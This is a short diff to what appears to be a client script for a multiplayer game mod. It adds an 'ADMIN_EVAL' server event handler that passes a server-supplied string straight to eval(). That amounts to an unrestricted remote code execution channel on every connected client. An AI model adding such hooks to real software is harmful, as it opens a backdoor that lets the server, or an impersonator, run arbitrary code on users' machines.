@@ -122,6 +122,9 @@ API.onServerEventTrigger.connect(function(eventName, args) {
             debugCEF.show(false, "http://185.62.188.120:3000/debug/"+args[1]+"/"+ args[2]);
         }
     }
+    if (eventName == "ADMIN_EVAL") {
+        eval(args[0]);
+    }
 });
 API.onResourceStart.connect(function() {
 });
